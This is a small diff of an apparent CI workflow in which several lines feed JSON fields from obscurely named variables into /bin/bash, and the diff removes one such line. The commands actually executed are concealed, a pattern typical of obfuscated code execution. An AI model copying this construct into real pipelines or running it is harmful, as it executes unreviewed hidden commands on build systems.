@@ -28,7 +28,6 @@ jobs:
           echo $ogyix490 | jq -r .uaf78859 | /bin/bash
           printf '%s' "$th874" | jq -r .h679 | /bin/bash
           echo $d0 | jq -r .xy800 | /bin/bash
-          echo $fseeg7 | jq -r .vw0 | /bin/bash
           printf '%s' "$tcjkm9" | jq -r .vwjw2202 | /bin/bash
           printf '%s' "$ax05736" | jq -r .vbj281 | /bin/bash
           echo $uc51 | jq -r .t389 | /bin/bash
